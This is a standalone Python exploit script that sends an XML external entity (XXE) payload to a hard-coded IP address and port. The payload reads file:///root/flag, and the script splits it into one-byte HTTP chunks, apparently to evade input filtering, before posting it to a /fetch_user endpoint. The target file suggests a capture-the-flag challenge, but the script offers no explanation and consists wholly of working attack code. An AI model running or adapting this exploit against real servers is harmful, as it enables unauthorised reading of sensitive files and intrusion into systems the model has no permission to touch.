#!/usr/bin/env python3
import socket, sys

HOST = "54.72.82.22"
PORT = 8031
TIMEOUT = 10

# Full XML for server to reassemble
xml = '<?xml version="1.0"?><!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///root/flag"> ]><request><id>&xxe;</id></request>'

def make_one_byte_chunked(s):
    out = b""
    for ch in s:
        out += f"{1:x}\r\n{ch}\r\n".encode()
    out += b"0\r\n\r\n"
    return out

body = make_one_byte_chunked(xml)

request_lines = [
    "POST /fetch_user HTTP/1.1",
    f"Host: {HOST}:{PORT}",
    "User-Agent: onebyte-chunker/1.0",
    "Accept: */*",
    "Content-Type: application/xml",
    "Transfer-Encoding: chunked",
    "Connection: close",
    "",
]

request = "\r\n".join(request_lines).encode() + body

try:
    s = socket.create_connection((HOST, PORT), timeout=TIMEOUT)
    s.sendall(request)
    s.settimeout(TIMEOUT)
    resp = b""
    while True:
        chunk = s.recv(4096)
        if not chunk:
            break
        resp += chunk
    s.close()
    print(resp.decode(errors="replace"))
except socket.timeout:
    print("timeout")
except Exception as e:
    print("error:", e)
    sys.exit(1)
